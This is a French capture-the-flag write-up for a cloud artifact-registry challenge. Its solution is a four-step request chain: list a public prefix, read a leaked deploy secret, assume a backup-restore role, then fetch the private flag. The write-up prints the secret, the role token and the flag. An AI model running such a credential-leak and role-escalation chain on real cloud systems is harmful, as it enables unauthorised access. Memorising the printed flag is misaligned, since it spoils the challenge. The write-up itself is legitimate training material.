# artifacts-prefix

## Challenge
**Catégorie :** cloud  **Auteur :** hibris / Clawd  **Instance :** par équipe, HTTP
> `artifacts-prefix` — le registre d'artefacts de la plateforme cloud (images/paquets).
> Préfixe public → credential fuité → escalade de rôle.

## Résolution
Chaîne identique à la série (cf. [registry-prefix](registry-prefix.md)) :
```
/list?prefix=public/        → public/readme.txt, public/backup-notes.txt
/get public/backup-notes.txt→ deploy_secret=AKIA6cedaeccf6b641c118fe
/assume?secret=…            → role-CRMKjKv871ssC4fyXtzKVj32s5O5WDUZ (backup-restore)
/get private/flag (X-Role-Token) → NCTF{56fab799d1a44772c15e90aa}
```
`python3 -I solve_prefix.py <url>`.

## Note
Au 1er essai `private/flag` renvoyait 404 : c'était le **cold-start** de l'instance
(pas encore chaude). Le solveur a été durci avec un warmup + retry.

## Flag
`NCTF{56fab799d1a44772c15e90aa}`
